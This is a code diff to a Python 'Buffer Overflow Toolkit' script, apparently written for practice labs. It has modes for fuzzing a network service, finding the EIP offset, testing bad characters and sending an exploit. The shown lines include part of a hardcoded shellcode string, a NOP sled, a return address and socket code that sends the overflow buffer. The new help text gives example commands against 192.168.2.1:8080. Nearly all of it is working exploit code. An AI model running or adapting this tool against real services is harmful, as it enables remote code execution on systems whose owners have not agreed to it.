@@ -1,4 +1,5 @@
 import argparse
+import binascii
 import socket
 import sys
 import time
@@ -111,7 +112,8 @@ def payload(domain, port, offset, retn):
 "\x38\x44\xec\x0a\xbb\x6c\x8d\xe8\xa3\x05\x88\xb5\x63\xf6\xe0"
 "\xa6\x01\xf8\x57\xc6\x03")
     padding = "x\90" * 16
-    buffer = "OVERFLOW1 " + ("A" * int(offset)) + "\xaf\x11\x50\x62" + padding + payload
+    retn = bytes.fromhex("af115062").decode("latin-1")
+    buffer = "OVERFLOW1 " + ("A" * int(offset)) + retn + padding + payload
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.settimeout(5)
@@ -123,29 +125,38 @@ def payload(domain, port, offset, retn):
         sys.exit(0)
 
 def main():
-    parser = argparse.ArgumentParser(description='Buffer Overflow Toolkit.')
-    parser.add_argument('-fm', help='fuzzing mode', action='store_true')
-    parser.add_argument('-om', help='find offset mode', action='store_true')
-    parser.add_argument('-qm', help='query offset mode', action='store_true')
-    parser.add_argument('-bm', help='bad characters mode', action='store_true')
-    parser.add_argument('-pm', help='payload mode', action='store_true')
-    parser.add_argument('-d', help='specify the domain of the buffer overflow.')
-    parser.add_argument('-p', help='specify the port of the buffer overflow.')
-    parser.add_argument('-l', help='specify the max length of the offset.')
-    parser.add_argument('-q', help='specify the EIP to query offset of.')
-    parser.add_argument('-o', help='specify the offset.')
-    parser.add_argument('-r', help='specify the return value in the EIP register.')
+    parser = argparse.ArgumentParser(description='Buffer Overflow Toolkit.', 
+            usage="buff.py [mode] [options]",
+            formatter_class=argparse.RawDescriptionHelpFormatter,
+            epilog='''
+FUZZING EXAMPLE: buff.py --fuzz -d 192.168.2.1 -p 8080
+OFFSET EXAMPLE: buff.py --offset -d 192.168.2.1 -p 8080 -l 1986
+QUERY EXAMPLE: buff.py --query -q 6F43396E
+BAD CHARACTERS EXAMPLE: buff.py --chars -d 192.168.2.1 -p 8080 -o 1986
+EXPLOIT EXAMPLE: buff.py --exploit -d 192.168.2.1 -p 8080 -o 1986 -r 'af115062'
+                    ''')
+    parser.add_argument('--fuzz', help='fuzzing mode', action='store_true')
+    parser.add_argument('--offset', help='find offset mode', action='store_true')
+    parser.add_argument('--query', help='query offset mode', action='store_true')
+    parser.add_argument('--chars', help='bad characters mode', action='store_true')
+    parser.add_argument('--exploit', help='exploit mode', action='store_true')
+    parser.add_argument('-d', metavar='', help='specify the domain of the buffer overflow.')
+    parser.add_argument('-p', metavar='', help='specify the port of the buffer overflow.')
+    parser.add_argument('-l', metavar='', help='specify the max length of the offset.')
+    parser.add_argument('-q', metavar='', help='specify the EIP to query offset of.')
+    parser.add_argument('-o', metavar='', help='specify the offset.')
+    parser.add_argument('-r', metavar='', help='specify the return value in the EIP register.')
 
     
     args = parser.parse_args()
-    if(args.fm):
+    if(args.fuzz):
         if(args.d == None):
             print("[!] Please specify a domain (-d) to fuzz.")
         if(args.p == None):
             print("[!] Please specify a port (-p) to fuzz.")
         if(args.d is not None and args.p is not None):
             fuzz(args.d, args.p)
-    elif(args.om):
+    elif(args.offset):
         if(args.d == None):
             print("[!] Please specify a domain (-d) to find the offset of.")
         if(args.p == None):
@@ -154,12 +165,12 @@ def main():
             print("[!] Please specify a max length of offset (-l).")
         if(args.d is not None and args.p is not None and args.l is not None):
             offset(args.d, args.p, int(args.l))
-    elif(args.qm):
+    elif(args.query):
         if(args.q == None):
             print("[!] Please specify an EIP to query (-q).")
         if(args.q):
             query_offset(args.q)
-    elif(args.bm):
+    elif(args.chars):
         if(args.d == None):
             print("[!] Please specify a domain (-d) to send bad characters to.")
         if(args.p == None):
@@ -168,7 +179,7 @@ def main():
             print("[!] Please specify an offset (-o) to send bad character to.")
         if(args.d is not None and args.p is not None and args.o is not None):
             bad_characters(args.d, args.p, args.o)
-    elif(args.pm):
+    elif(args.exploit):
         if(args.d == None):
             print("[!] Please specify a domain (-d) to send the payload to.")
         if(args.p == None):
